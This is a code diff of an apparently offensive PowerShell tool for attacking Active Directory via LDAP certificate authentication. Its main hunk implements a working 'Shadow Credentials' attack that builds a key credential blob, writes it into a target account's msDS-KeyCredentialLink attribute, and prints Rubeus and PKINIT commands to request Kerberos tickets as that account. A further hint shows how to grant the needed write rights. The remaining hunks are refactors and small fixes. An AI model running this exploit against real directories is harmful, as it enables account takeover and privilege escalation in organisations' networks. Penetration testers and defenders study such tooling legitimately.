-            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'ShadowCredentials' -IdentityDN 'CN=Wanha WS. SH4D0W,CN=Users,DC=X' -TargetDN 'CN=John JD. DOE,CN=Users,DC=X'
+            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X'
 
-            Grants the principal `Wanha WS. SH4D0W` Read/Write privileges against the `CN=John JD. DOE,CN=Users,DC=X`:`msDS-KeyCredentialLink` attribute
+            Populates the targeted account `CN=John JD. DOE,CN=Users,DC=X`:`msDS-KeyCredentialLink` attribute with a new self-signed certificate.
+
+            - This requires WRITE privileges against the target's `msDS-KeyCredentialLink` attribute.
 
         .LINK
 
@@ -9815,17 +10365,124 @@ function _LDAPExploit {
             Write-Host "[*$Exploit*] Successfully Provided SDDL Rights 'ReadProperty, WriteProperty' To '$IdentityDN' Against '$TargetDN':'msDS-AllowedToActOnBehalfOfOtherIdentity' !!";
 
         }
-
-        "ShadowCredentials" {
+        
+        "ShadowCreds" {
             
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
-            Write-Verbose "[*$Exploit*] Granting SDDL ACE Rights 'ReadProperty, WriteProperty' To '$IdentityDN' Against '$TargetDN':'msDS-KeyCredentialLink'..."
+            try {
 
-            _CreateInboundSDDL -LdapConnection $LdapConnection -IdentityDN $IdentityDN -TargetDN $TargetDN -Attribute 'msDS-KeyCredentialLink' -SDDLACEType 'OA' -SDDLACERights 'RPWP'
+                $sAMAccountName = _Filter -LdapConnection $LdapConnection -SearchBase $IdentityDN -SearchScope Base |Select -ExpandProperty sAMAccountName
 
-            Write-Host "[*$Exploit*] Successfully Provided SDDL Rights 'ReadProperty, WriteProperty' To '$IdentityDN' Against '$TargetDN':'msDS-KeyCredentialLink' !!";
+                # 1. Generate a self-signed certificate and export to file
+                $NewSelfSignedCertificate = _Helper-GenerateSelfSignedCertificate -CN $sAMAccountName
+                _Helper-ExportCertificateToFile -Certificate $NewSelfSignedCertificate -ExportPath "$sAMAccountName.pfx"
+                
+                # 2.a. Initalize Variables
+                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L285
+                $RawKeyMaterial         = _Helper-ExportRSAPublicKeyBCrypt -Certificate $NewSelfSignedCertificate
+                #$RawKeyMaterial        = _Helper-ExportRSAPublicKeyDER -Certificate $NewSelfSignedCertificate
 
+                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L295-L318
+                $Version                = [uint32]0x00000200
+                $Identifier             = [System.Security.Cryptography.SHA256]::Create().ComputeHash($RawKeyMaterial)
+                $CreationTime           = [datetime]::UtcNow.ToFileTimeUtc()
+                $KeyUsage               = [byte]0x01
+                $KeySource              = [byte]0x00
+                $DeviceId               = [Guid]::NewGuid()
+                
+                # 2.a. Initialize Entries IDs
+                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/
+                $Entry_KeyID            = [byte]0x01
+                $Entry_KeyHash          = [byte]0x02
+                $Entry_KeyMaterial      = [byte]0x03
+                $Entry_KeyUsage         = [byte]0x04
+                $Entry_KeySource        = [byte]0x05
+                $Entry_DeviceId         = [byte]0x06
+                $Entry_KeyCreationTime  = [byte]0x09
+
+
+                # 3. Build Blobs (CustomKeyInfo and LastLogonTime are not specified)
+                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L425-L510
+
+                # 3.a Properties Blob
+                $propertyStream = New-Object System.IO.MemoryStream
+                $propertyWriter = New-Object System.IO.BinaryWriter $propertyStream
+
+                $propertyWriter.Write([uint16]$RawKeyMaterial.Length)
+                $propertyWriter.Write([byte]$Entry_KeyMaterial)
+                $propertyWriter.Write([byte[]]$RawKeyMaterial)
+                #Write-Verbose "RawKeyMaterial $($RawKeyMaterial.Length) propertyWriter length so far: $($propertyStream.Length)"
+
+                $propertyWriter.Write([uint16]$KeyUsage.Length)
+                $propertyWriter.Write([byte]$Entry_KeyUsage)
+                $propertyWriter.Write([byte[]]$KeyUsage)
+                #Write-Verbose "KeyUsage $($KeyUsage.Length) propertyWriter length so far: $($propertyStream.Length)"
+
+                $propertyWriter.Write([uint16]$KeySource.Length)
+                $propertyWriter.Write([byte]$Entry_KeySource)
+                $propertyWriter.Write([byte[]]$KeySource)
+                #Write-Verbose "KeySource $($KeySource.Length) propertyWriter length so far: $($propertyStream.Length)"
+
+                $propertyWriter.Write([uint16]$DeviceId.ToByteArray().Length)
+                $propertyWriter.Write([byte]$Entry_DeviceId)
+                $propertyWriter.Write([byte[]]$DeviceId.ToByteArray())
+                #Write-Verbose "DeviceId $($DeviceId.ToByteArray().Length) propertyWriter length so far: $($propertyStream.Length)"
+
+                $propertyWriter.Write([uint16]([BitConverter]::GetBytes($CreationTime)).Length)
+                $propertyWriter.Write([byte]$Entry_KeyCreationTime)
+                $propertyWriter.Write([byte[]]([BitConverter]::GetBytes($CreationTime)))
+                #Write-Verbose "CreationTime $([BitConverter]::GetBytes($CreationTime).Length) propertyWriter length so far: $($propertyStream.Length)"
+
+                $binaryProperties = $propertyStream.ToArray()
+
+
+                # 3.b Key Credential Blob
+                $blobStream = New-Object System.IO.MemoryStream
+                $blobWriter = New-Object System.IO.BinaryWriter $blobStream
+
+                $blobWriter.Write([uint32]$Version)
+                #Write-Verbose "Version $($Version.Length) blobWriter length so far: $($blobStream.Length)"
+
+                $blobWriter.Write([uint16]$Identifier.Length)
+                $blobWriter.Write([byte]$Entry_KeyID)
+                $blobWriter.Write([byte[]]$Identifier)
+                #Write-Verbose "Identifier $($Identifier.Length) blobWriter length so far: $($blobStream.Length)"
+
+                $keyHash = [System.Security.Cryptography.SHA256]::Create().ComputeHash($binaryProperties)
+                $blobWriter.Write([uint16]$keyHash.Length)
+                $blobWriter.Write([byte]$Entry_KeyHash)
+                $blobWriter.Write([byte[]]$keyHash)
+                #Write-Verbose "keyHash $($keyHash.Length) blobWriter length so far: $($blobStream.Length)"
+
+                $blobWriter.Write([byte[]]$binaryProperties)
+                #Write-Verbose "binaryProperties $($binaryProperties.Length) blobWriter length so far: $($blobStream.Length)"
+
+                $binaryKeyCredential = $blobStream.ToArray()
+
+
+                # 4. Convert into DN With Binary String
+                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L512-L516
+                $Hex = ($binaryKeyCredential | ForEach-Object { '{0:X2}' -f $_ }) -join ''
+                $DNWithBinary = "B:$($Hex.Length):$($Hex):$IdentityDN"
+                
+                # 5. Populate !
+                _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute 'msDS-KeyCredentialLink' -Value $DNWithBinary
+
+                Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'ShadowCreds'"
+                Write-Host "[*$Exploit*] [Authenticate] gettgtpkinit.py -dc-ip <dc_ip> -cert-pfx '$sAMAccountName.pfx' -pfx-pass '' $(_Helper-GetDomainNameFromDN -DN $IdentityDN)/'$sAMAccountName' './out.ccache'"
+                Write-Host "[*$Exploit*] [Authenticate] Rubeus.exe asktgt /user:'$sAMAccountName' /certificate:'$sAMAccountName.pfx' /password:'' /domain:$(_Helper-GetDomainNameFromDN -DN $IdentityDN) /dc:<dc_ip> /nowrap"
+
+
+            } catch { 
+
+                Write-Host "[*$Exploit*] [!] Exploitation Failed With Error: $_"; 
+                Write-Host "[*$Exploit*] [*] Hint: Do You Have Write Privileges Against The '$IdentityDN':'msDS-KeyCredentialLink' Attribute ? If Not, You May Execute (If Allowded):"
+                Write-Host "[*$Exploit*] [Grant] Invoke-PassTheCert -Action 'CreateInboundSDDL' -LdapConnection `$LdapConnection -Identity '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -Target '$IdentityDN' -Attribute 'msDS-KeyCredentialLink' -SDDLACEType 'OA' -SDDLACERights 'RPWP'"
+                return
+
+            }
+            
         }
 
         Default { Write-Host "[!] LDAP Exploitation '$Exploit' Not Recognized !"; return }
@@ -10029,22 +10686,7 @@ function Invoke-PassTheCert-GetLDAPConnectionInstance {
 
     try {
         # Load client certificate
-        if ($CertificatePassword) {
-            Write-Host "[*] Loading Subject Certificate File '$Certificate', Protected With Password: $CertificatePassword"
-        } else {
-            Write-Host "[*] Loading Subject Certificate File '$Certificate', Passwordless"
-        }
-
-        if (Test-Path -Path $Certificate) {
-            # File Certificate
-            $LoadedCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($Certificate, $CertificatePassword, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
-        }
-        else {
-            # Base64 Certificate
-            $CertificateBytes = [System.Convert]::FromBase64String($Certificate)  
-            $LoadedCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($CertificateBytes, $CertificatePassword, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
-        }
-        Write-Host "[+] Successfully Loaded Subject Certificate !"
+        $LoadedCertificate = _Helper-GetCertificateFromFileOrBase64 -Certificate $Certificate -CertificatePassword $CertificatePassword
         
         # Set LDAP connection
         Write-Host "[*] Connecting To LDAP/S Server $($Server):$($Port)..."
@@ -10091,13 +10733,13 @@ function Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile {
 
         .PARAMETER ExportPath
 
-            [System.System] 
+            [System.String] 
             
             The path of the certificate to be exported
 
         .PARAMETER ExportContentType
 
-            [System.System] 
+            [System.String] 
             
             The ContentType of the certificate to be exported (among 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', 'Authenticode') (Optional)
             
@@ -10105,7 +10747,7 @@ function Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile {
 
         .PARAMETER ExportPassword
 
-            [System.System] 
+            [System.String] 
             
             The password of the certificate to be exported (Optional)
 
@@ -10182,42 +10824,8 @@ function Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile {
 
     Write-Host ""
 
-    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+    _Helper-ExportCertificateToFile -Certificate $LdapConnection.ClientCertificates[0] -ExportPath $ExportPath -ExportContentType $ExportContentType -ExportPassword $ExportPassword
 
-    try {
-        if (-not $ExportPassword) {
-            $SuffixString = "Passwordless"
-            $SecureString = (New-Object System.Security.SecureString)
-        } else {
-            $SuffixString = "Protected With Password: $ExportPassword"
-            $SecureString = (ConvertTo-SecureString $ExportPassword -AsPlainText -Force)
-        }
-
-    Write-Verbose "[!] Exporting The LDAP Connection Instance To The File '$ExportPath' Of Type '$ExportContentType', $SuffixString ..."
-
-        switch ($ExportContentType) {
-            "Unknown" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Unknown; break; } #??
-            "Cert" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Cert; break; }
-            "SerializedCert" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::SerializedCert; break; }
-            "PFX" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx; break; }
-            "Pkcs12" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs12; break; }
-            "SerializedStore" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::SerializedStore; break; }
-            "Pkcs7" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs7; break; }
-            "Authenticode" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Authenticode; break; }
-            Default { Write-Host "[!] X509ContentType '$ExportContentType' Not Recognized !"; return; }
-        }
-
-        Set-Content -Path $ExportPath -AsByteStream -Force -Value (
-            $LdapConnection.ClientCertificates[0].Export(
-                $X509ContentType,
-                $SecureString
-            )
-        )
-
-        Write-Host "[+] Successfully Exported The LDAP Connection Instance To File '$ExportPath' Of Type '$ExportContentType', $SuffixString"
-
-    } catch { Write-Host "[!] Exporting The Provided LDAP Connection Instance To File '$ExportPath' Of Type '$ExportContentType' Failed With Error: $_" }
-    
     Write-Host ""
 }
 
@@ -10687,11 +11295,12 @@ function Invoke-PassTheCert {
                 $Result = _LDAPExtendedOperationPasswordModify -LdapConnection $LdapConnection -NewPassword $NewPassword; 
             }
             "Filter" { 
-                if ($LDAPFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -LDAPFilter $LDAPFilter -SearchScope $SearchScope -Properties $Properties; }
                 if ($DNFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -DNFilter $DNFilter -SearchScope $SearchScope -Properties $Properties; }
-                if ($UACFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -UACFilter $UACFilter -SearchScope $SearchScope -Properties $Properties; }
-                if ($GUIDFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -GUIDFilter $GUIDFilter -SearchScope $SearchScope -Properties $Properties; }
-                if ($SIDFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SIDFilter $SIDFilter -SearchScope $SearchScope -Properties $Properties; }
+                elseif ($UACFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -UACFilter $UACFilter -SearchScope $SearchScope -Properties $Properties; }
+                elseif ($GUIDFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -GUIDFilter $GUIDFilter -SearchScope $SearchScope -Properties $Properties; }
+                elseif ($SIDFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SIDFilter $SIDFilter -SearchScope $SearchScope -Properties $Properties; }
+                elseif ($LDAPFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -LDAPFilter $LDAPFilter -SearchScope $SearchScope -Properties $Properties; }
+                else { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -Properties $Properties; }
             }
             "CreateObject" {
                 if ($NewPassword -eq '') { $Result = _CreateObject -LdapConnection $LdapConnection -ObjectType $ObjectType -ObjectDN $ObjectDN -sAMAccountName $sAMAccountName -UACFlags $UACFlags -NewPassword ''; }
